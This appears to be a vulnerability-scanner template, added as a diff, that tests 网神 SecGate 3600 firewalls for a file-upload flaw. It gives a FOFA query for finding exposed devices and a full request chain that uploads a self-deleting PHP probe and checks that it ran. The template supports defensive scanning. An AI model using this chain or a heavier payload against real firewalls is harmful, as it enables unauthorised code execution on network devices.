@@ -1,0 +1,64 @@
+id: wangshen-secgate-net_pro_keyword_import_save-fileupload
+
+info:
+  name: wangshen-secgate-net_pro_keyword_import_save-fileupload
+  author: unknow
+  severity: critical
+  description: 网神 防火墙 secgate-net_pro_keyword_import_save 存在文件上传漏洞。
+  tags: wangshen,fileupload
+  metadata:
+    fofa-query: title="网神SecGate 3600防火墙"
+
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+      - |
+        POST /?q=net_pro_keyword_import_save HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Length: 449
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Cookie: __s_sessionid__={{cookie}};
+        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
+
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="reqfile";filename="{{cookie}}.php"
+        Content-Type: text/plain
+
+        <?php echo(md5(233));unlink(__FILE__);?>
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="submit_post"
+
+        net_pro_keyword_import_save
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="certfile_r"
+
+        file
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+
+      - |
+        GET /attachements/{{cookie}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: __s_sessionid__={{cookie}};
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15                    
+
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        internal: true
+        group: 1        
+        regex:
+          - "__s_sessionid__=(.*);"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_3==200 && contains(body_3, "e165421110ba03099a1c0393373c5b43") && contains(header_3, "text/html")'
